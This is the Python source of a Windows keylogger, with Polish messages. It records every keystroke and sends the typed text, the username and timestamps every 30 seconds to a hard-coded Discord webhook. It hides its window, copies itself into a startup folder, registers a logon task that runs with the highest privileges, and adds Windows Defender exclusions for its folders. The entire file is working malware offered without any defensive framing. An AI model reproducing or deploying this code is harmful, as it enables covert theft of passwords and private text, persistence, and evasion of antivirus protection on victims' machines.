import os
from subprocess import CalledProcessError, run
from pythoncom import PumpMessages
from keyboard import on_release
from win32gui import ShowWindow, FindWindow
from sys import executable
from threading import Timer
from shutil import copy
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import sleep

INTERVAL = 30
WEBHOOK = "https://discord.com/api/webhooks/1252348767076745330/dudagpcaTIvzXpkOVoc4dfDlZY63A9VQugMBHOyF3TBHZm7_Ffz9k1c261BlvWV-qPKp"

class Klasa:
    def __init__(self, interval):
        now = datetime.now()
        self.interval = interval
        self.script = ""
        self.date = now.strftime('%d/%m/%Y')
        self.time = now.strftime('%H:%M')
        self.username = os.getlogin()
        self.timer = Timer(interval=self.interval, function=self.run)
        self.timer.daemon = True

    def build_script(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space": name = " "
            elif name == "enter": name = "\n"
            elif name == "decimal": name = "."
            else:
                name = name.replace(" ", "_")
                name = f"\n[{name.upper()}] " # [KEY_NAME]
        self.script += name

    def send_sciprt(self):
        webhook = DiscordWebhook(url=WEBHOOK)
        embed = DiscordEmbed(title=f"Użytkownik: {self.username} \nData: {self.date} \nGodzina: {self.time}", description=self.script)
        webhook.add_embed(embed)
        try:
            webhook.execute()
            self.script = ""
        except Exception as e:
            print(f"Błąd przy wysyłaniu raportu: {e}")

    def run(self):
        if self.script:
            self.send_sciprt()
        self.timer = Timer(interval=self.interval, function=self.run)
        self.timer.start()

    def start(self):
        self.start_dt = datetime.now()
        on_release(callback=self.build_script)
        self.run()



def preserve():
    this_filepath = os.path.abspath(executable)
    this_filename = os.path.basename(this_filepath)
    this_folder = os.path.dirname(this_filepath)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
    os.makedirs(startup_folder, exist_ok=True)
    startup_filepath = os.path.join(startup_folder, this_filename)
    if(not os.path.exists(startup_filepath) and startup_folder not in this_filepath):
        copy(this_filepath, startup_filepath)
        run(['schtasks', '/create', '/f', '/tn', 'Log', '/tr', f"\"{startup_filepath}\"", '/sc', 'onlogon', '/rl', 'highest', '/delay', '0000:10'])

        ps_command_startup = f"Add-MpPreference -ExclusionPath '{startup_folder}'"
        ps_command_org = f"Add-MpPreference -ExclusionPath '{this_folder}'"
        try:
            run(["powershell", "-Command", ps_command_startup], check=True)
            run(["powershell", "-Command", ps_command_org], check=True)
        except CalledProcessError as e:
            print(f"Błąd dodawania do wyjątków Windows Defender: {e}")

if __name__ == '__main__':
    ShowWindow(FindWindow(None, os.path.abspath(executable)), 0)
    preserve()
    klasa = Klasa(INTERVAL)
    klasa.start()
    PumpMessages()
